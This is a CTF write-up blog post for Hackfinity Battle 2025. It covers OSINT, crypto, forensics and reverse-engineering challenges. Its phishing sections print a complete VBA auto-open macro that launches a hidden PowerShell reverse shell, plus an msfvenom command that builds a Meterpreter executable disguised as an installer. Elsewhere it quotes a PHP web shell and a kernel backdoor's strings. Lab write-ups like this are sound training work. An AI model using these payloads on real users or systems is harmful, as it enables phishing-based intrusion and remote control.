+++
title = "Hackfinity Battle CTF 2025"
description = "Collection of writeups for Hackfinity Battle CTF 2025 challenges."
date = 2025-03-19T15:00:00Z
author = ["Reber", "Ghostzao"]
tags = ["ctf","osint","cryptography","forensics"]
categories = ["CTF Writeups"]
+++

![R4p3cks](/images/R4p3cks.png)

## Table of Contents

- [Table of Contents](#table-of-contents)
  - [OSINT Challenges](#osint-challenges)
    - [Catch Me If You Can](#catch-me-if-you-can)
      - [Challenge](#challenge)
      - [Solution](#solution)
    - [Catch Me If You Can 3](#catch-me-if-you-can-3)
      - [Challenge](#challenge-1)
      - [Solution](#solution-1)
  - [Cryptography Challenges](#cryptography-challenges)
    - [Dark Matter](#dark-matter)
      - [Challenge](#challenge-2)
      - [Solution](#solution-2)
    - [Order](#order)
      - [Challenge](#challenge-3)
      - [Solution](#solution-3)
  - [Red Teaming Challenges](#red-teaming-challenges)
    - [Ghost Phishing](#ghost-phishing)
      - [Challenge](#challenge-4)
      - [Solution](#solution-4)
    - [Shadow Phishing](#shadow-phishing)
      - [Challenge](#challenge-5)
      - [Solution](#solution-5)
  - [Web Exploitation Challenges](#web-exploitation-challenges)
    - [Infinity Shell](#infinity-shell)
      - [Challenge](#challenge-6)
      - [Solution](#solution-6)
  - [Forensics Challenges](#forensics-challenges)
    - [Sneaky Patch](#sneaky-patch)
      - [Challenge](#challenge-7)
      - [Solution](#solution-7)
  - [Reverse Engineering Challenges](#reverse-engineering-challenges)
    - [The Game](#the-game)
      - [Challenge](#challenge-8)
      - [Solution](#solution-8)
    - [The Game v2](#the-game-v2)
      - [Challenge](#challenge-9)
      - [Solution](#solution-9)

### OSINT Challenges

#### Catch Me If You Can

##### Challenge

Thanks to Void's l33t hacking skills, we obtained some CCTV footage from 2022 that might help us track Cipher's location. Our intel tells us that the individual caught on the CCTV footage that day was one of Cipher's accomplices. They were planning to meet up at one of Cipher's safe houses.
We have this image of Cipher's accomplice, Phicer, leaving a restaurant.
Can you and Specter find the name of the burger restaurant?

Flag format: __THM{restaurant_name}__, separate words with underscores, and no capital letters .

For example: __THM{the_best_pizza}__.

It is also provided the CCTV image.

![CCTV-Image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/beco_osint.png)

##### Solution

Investigating the image, we can find a plate saying "Beco do Batman".

![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/beco_do_batman.png)

With google maps help, we can search Beco do Batman and get a location in Sao Paulo.

![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps.png)

With a little search, we found that this is the exact location and the burger restaurant mentioned.

![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps2.png)

![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps3.png)

The requested restaurant is Coringa do Beco!

#### Catch Me If You Can 3

##### Challenge

Unfortunately, we were unable to recover any more CCTV footage. Just as we were losing hope, Void clutched again and managed to crack the encryption on a message we recovered, sent from Cipher to Phicer in 2022:

>Meet me at the Mr.Wok safe house

Can you find the full address of their safe house?

Flag format: __THM{streetnumber_street_name}__ , no capitals and no special symbols.

For example: If the address is 24 Rua Pablo Antonio, the flag would be __THM{23_pablo_antonio}__.

##### Solution

Following the other challenges, this safe house must be in the same region, Sao Paulo. We searched the internet for "Mr Wok sao paulo". The first result fitted well for what we were looking for. The address is __*Rua Galvão Bueno, 83, São Paulo, BR 01506-000*__.

![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan3/search_cmiyc3.png)

### Cryptography Challenges

#### Dark Matter

##### Challenge

The Hackfinitiy high school has been hit by DarkInjector's ransomware, and some of its critical files have been encrypted. We need you and Void to use your crypto skills to find the RSA private key and restore the files.
After some research and reverse engineering, you discover they have forgotten to remove some debugging from their code. The ransomware saves this data to the tmp directory.

Can you find the RSA private key?

>It is provided a VM with the necessary!

Starting the provided VM, it is prompted the following:

![image](/hackfinity-battle-ctf-2025/DarkMatter/ransomware.png)

##### Solution

It is said that the tmp directory was used to save data from the debugging of the ransomware. This is what tmp contains:

![image](/hackfinity-battle-ctf-2025/DarkMatter/folders.png)

At first glance, the files that look promising are __*encrypted_aes_key.bin*__ and __*public_key.txt*__. As said in the challenge statement, we need to find the RSA private key, so we can exclude the __*encrypted_aes_key.bin*__. Opening the __*public_key.txt*__
we can confirm that this key is a RSA public key because of the *n* and *e*.

![image](/hackfinity-battle-ctf-2025/DarkMatter/key_info.png)

>This *n* is called the modulus and is calculated by *p * q* (Two large prime numbers that are kept secret) operation.
> The public exponent, is typically a small prime number chosen to be relatively prime to (p−1)(q−1).
>What we want is *d* the private exponent, calculated as:
>![image](/hackfinity-battle-ctf-2025/DarkMatter/dformula.png)

So if we obtain *p* and *q* we can obtain *d* (private key). If *n* is a small number, it is computationally feasible to factorize it and obtain p and q, which it is. We used a online number facotrizer to be more fast in the process, rather than doing a python script.
We used this site ([Number Empire Number Factorizer](https://www.numberempire.com/numberfactorizer.php)).

The p and q are the following numbers:

![image](/hackfinity-battle-ctf-2025/DarkMatter/NumberFactorizer.png)

Calculating *d* with what we have, we obtain __196442361873243903843228745541797845217__. This number is the private key. When used in thee ransomware note the files are decrypted with success.

![image](/hackfinity-battle-ctf-2025/DarkMatter/ransomwaredecryption.png)

The key is in the __*student_grades.docx*__ document.

![image](/hackfinity-battle-ctf-2025/DarkMatter/flag.png)

#### Order

##### Challenge

We intercepted one of Cipher's messages containing their next target. They encrypted their message using a repeating-key XOR cipher. However, they made a critical error—every message always starts with the header:

>ORDER:

Can you help void decrypt the message and determine their next target?
Here is the message we intercepted:

>1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f63731a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60

##### Solution

The challenge explicitly indicates that the message used repeating-key XOR cipher and every message always start with the header __*ORDER:*__.

>A repeating-key XOR cipher is a type of encryption that uses a key that is repeated to match the length of the plaintext. Each character of the plaintext is XORed with the corresponding character of the key, making it a symmetric encryption method where the same process is used for both encryption and decryption.

If every message starts with header __*ORDER:*__ we can find the first characters in the intercepted message (Because of the XOR). Using an online encrypter and decrypter ([md5decrypt.net/en/Xor/](https://md5decrypt.net/en/Xor/)), we managed to find the following:

![image](/hackfinity-battle-ctf-2025/Order/firstdec.png)

This indicates that __*SNEAKY*__ was the key used to encrypt the message. So repeating the process but this time with SNEAKY as the key we can decrypt the message.

![image](/hackfinity-battle-ctf-2025/Order/seconddec.png)

### Red Teaming Challenges

#### Ghost Phishing

##### Challenge

We have successfully gained access to DarkSpecter's email, and this leak contains a direct connection to Cipher's latest operations.
Within the encrypted exchanges are invaluable intelligence: Information on recent attacks, compromised systems, and which might be the next target.
This could be our best chance to forecast Cipher's next move and dismantle his network once and for all.

__Username:__ <specter@darknetmail.corp>
__Password:__ YouCantCatchMe

##### Solution

When opened the DarkSpecter's email we are faced with the following:

![image](/hackfinity-battle-ctf-2025/GhostPhishing/firstemail.png)

So the first thing we did was send an simple document (txt) with a attack report and asking for a password to see what cipher responds. The response was this:

![image](/hackfinity-battle-ctf-2025/GhostPhishing/secondemail.png)

After multiple tries, we search a bit about what could be done with docx and docm documents. We found that it is possible, using macros, do a reverse shell.
Basically, when cipher opens the document, it will run a piece of code that will connect to our machine. For this we need to activate the macros in Word.
>File -> Options -> Customize Ribbon -> Enable Developer Options in the Right Pane.
After this, we need to create our macro code. The code is the following:

```vba
Sub AutoOpen()
MyMacro
End Sub

Sub Document_Open()
MyMacro
End Sub

Sub MyMacro()
Dim Str As String
Str = "powershell -nop -w hidden -noni -c ""$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
CreateObject("Wscript.Shell").Run Str
End Sub
```

Where it is `LHOST` and `LPORT` we put our local ip and port.
Now for the macro work we need to do the following thing:

- Go to Developer on the menu above and select Macros.
- We need to make sure that we are creating the macro in the document we want to send. (We were struggling a bit because we were saving in other location and, because of that, we weren't managing to get a reverse shell ;( )
![image](/hackfinity-battle-ctf-2025/GhostPhishing/macros.png)
- Click in create and copy and paste the code above and save.
![image](/hackfinity-battle-ctf-2025/GhostPhishing/macros2.png)
- After this close the window and save the document.

After this we have our macro ready to go. We send the email with the document attached and wait for cipher make this mistake of opening it. Before sending it we need to set up a listener in our machine.
Using ncat for that:

![image](/hackfinity-battle-ctf-2025/GhostPhishing/ncat.png)

Finally, we send the document in the attachments and wait for the connection.

![image](/hackfinity-battle-ctf-2025/GhostPhishing/thirdemail.png)

Now the easy part, search for the flag. It is said that we need the Administrator flag. So we looked in Administrator user and found the flag in the Desktop directory.

![image](/hackfinity-battle-ctf-2025/GhostPhishing/remoteaccess.png)

#### Shadow Phishing

##### Challenge

We gained access to the email account of ShadowByte, one of Cipher's trusted operatives.
This breakthrough will help bring Cipher's location closer to light and foil his plans for the apocalyptic cyber weapon.
The clock is ticking, though too much time and Cipher will know something is wrong and again disappear into the depths of the darknet.  The race against time goes on.

__Username:__ <mailto:shadowbyte@darknetmail.corp>

__Password:__ ShadowIsTheBest

##### Solution

When accessing the ShadowByte email we see this email from Cipher:

![image](/hackfinity-battle-ctf-2025/ShadowPhishing/firstemail.png)

Cipher told ShadowByte that he needs a exe! Like Ghost Phishing challenge, we could create a reverse TCP shell windows executable. For this we used metasploit for a faster and easy way to create this.

We used this command to generate our executable named silentEdgeInstaller.exe to match what Cipher wanted:

```bash
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.23.56.134 LPORT=8080 -f exe -o /home/thm/silentEdgeInstaller.exe
```

After we went to the msfconsole and created our payload and started listenning for incoming connections.
![image](/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit.png)
![image](/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit2.png)

After this we sent the executable to Cipher, replying to the email he sent. He didnt responded but we got the connection.

![image](/hackfinity-battle-ctf-2025/ShadowPhishing/access.png)

They want the Administrator flag. So we went to the Administrator desktop and found the flag!

![Untitled design](/hackfinity-battle-ctf-2025/ShadowPhishing/access2.png)

### Web Exploitation Challenges

#### Infinity Shell

##### Challenge

Cipher’s legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps!

##### Solution

It is said that the cipher's legion of bots left a dangerous web shell implant. Exploring the /var/www/html folder we found a shoulder containing the web application mentioned in the statement.

![image](/hackfinity-battle-ctf-2025/InfinityShell/folder.png)

This site, probably contained some kind of field to insert files without checking them. Probably, cipher abused this... We checked the img folder and found a suspicious file called images.php with following code:

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This file is weird. First is using system() function and is in the middle of the images. At the time we were clueless about this file, probably was being used by the site to get images, but using base64_decode was strange.

After a bit of investigation, we found nothing. If the attacker uploaded a malicious file, he probably used it as a web shell. So we checked the logs. After a bit of searching we found the following:

![image](/hackfinity-battle-ctf-2025/InfinityShell/folder2.png)

We opened the last file in hope for access logs by this actors. And we found something!

![Untitled design(1)](/hackfinity-battle-ctf-2025/InfinityShell/log.png)

The line 81 looked promising. A string encoded in base64.

```base64
ZWNoby---------------------------Gx9Jwo=
```

Decoding it we can obtain the flag!

Note: This could be done using cat and then filtering the entries and was much easier.

### Forensics Challenges

#### Sneaky Patch

##### Challenge

A high-value system has been compromised. Security analysts have detected suspicious activity within the kernel, but the attacker’s presence remains hidden. Traditional detection tools have failed, and the intruder has established deep persistence. Investigate a live system suspected of running a kernel-level backdoor.

It's provided a Machine to investigate

##### Solution

From the description, we thought in starting searching in the kernel logs. Executing the command:

```bash
sudo dmesg
```

It was possible to watch some interesting things from the output:

```bash
[   26.371308] systemd-journald[132]: File /var/log/journal/dc7c8ac5c09a4bbfaf3d09d399f10d96/user-1000.journal corrupted or uncleanly shut down, renaming and replacing.
[   32.701060] spatch: loading out-of-tree module taints kernel.
[   32.701072] spatch: module verification failed: signature and/or required key missing - tainting kernel
[   32.702610] [CIPHER BACKDOOR] Module loaded. Write data to /proc/cipher_bd
[   32.704977] [CIPHER BACKDOOR] Executing command: id
[   32.711742] [CIPHER BACKDOOR] Command Output: uid=0(root) gid=0(root) groups=0(root)

[   41.059522] traps: mate-power-mana[1887] trap int3 ip:71d3aec050df sp:7fff1aa8dd40 error:0 in libglib-2.0.so.0.8000.0[71d3aebc1000+a0000]
```

We can observe:

- Module 'spatch' loaded, it's out-of-tree & tainted, this proves that this module is not suppose to be in kernel.
- The backdoor exists ([CIPHER BACKDOOR]) and accepts commands though the /proc/cipher_bd archive.
Let's find where this 'spatch' is:

```bash
find / -type f -name 'spatch.ko' 2>/dev/null
```

Output:

```bash
/lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko
```

After getting the path we search inside the module:

```bash
strings /lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko | less
```

Output:

```bash
6[CIPHER BACKDOOR] Module loaded. Write data to /proc/%s
6[CIPHER BACKDOOR] Module unloaded.
3[CIPHER BACKDOOR] Failed to read output file
6[CIPHER BACKDOOR] Command Output: %s
3[CIPHER BACKDOOR] No output captured.
6[CIPHER BACKDOOR] Executing command: %s
3[CIPHER BACKDOOR] Failed to setup usermode helper.
6[CIPHER BACKDOOR] Format: echo "COMMAND" > /proc/cipher_bd
6[CIPHER BACKDOOR] Try: echo "%s" > /proc/cipher_bd
6[CIPHER BACKDOOR] Here's the secret: 54484-----------------------------
PATH=/sbin:/bin:/usr/sbin:/usr/bin
description=Cipher is always root
```

Interesting:

__6[CIPHER BACKDOOR] Here's the secret: 54484-----------------------__

Using CyberChef[https://cyberchef.org/] to convert the hash from hexa to text you get the flag: THM{...}

### Reverse Engineering Challenges

#### The Game

##### Challenge

Cipher has gone dark, but intel reveals he’s hiding critical secrets inside Tetris, a popular video game. Hack it and uncover the encrypted data buried in its code.

>It is provided a zip with a executable inside it [Download_Tetrix.zip](/hackfinity-battle-ctf-2025/TheGame/Tetrix.exe-1741979048280.zip)

##### Solution

This challenge was very easy. We extracted the zip and isolated the executable. With the program *strings* we found the flag.

> $ strings Tetrix.exe | grep THM

#### The Game v2

##### Challenge

Cipher’s trail led us to a new version of Tetris hiding encrypted information. As we cracked its code, a chilling message emerged: "The game is never over."

>It is provided a zip with a executable inside it [Download_Tetrix_v2.zip](/hackfinity-battle-ctf-2025/TheGame2/TetrixFinalv2.exe-1742225230694.zip)

##### Solution

This challenge was harder than the v1 version of this. This time using *strings* was not possible to obtain the flag or any useful info.
To gather more information we executed the game in a secure environment. We compared it to the version 1 and it was different. The most different thing was that the v2 has a string saying the following:

![image](/hackfinity-battle-ctf-2025/TheGame2/game.png)

This must be a hint to obtain the flag. It was time for some game hacking. We used cheat engine to be able to modified values in the process running the game. The first thing that we thought was to modified the score to a number higher to 999999.
Unsuccessfully.

![image](/hackfinity-battle-ctf-2025/TheGame2/game2.png)

Five results, when searching for the score value. We tried to change every value of the five addresses. Nothing...

If changing the score does nothing, what about changing the minimum score.

![image](/hackfinity-battle-ctf-2025/TheGame2/game3.png)

This looked promising, so we changed the value in the first address to 100. So if we scored 100 points maybe the program would show something. And it did.

![image](/hackfinity-battle-ctf-2025/TheGame2/game4.png)
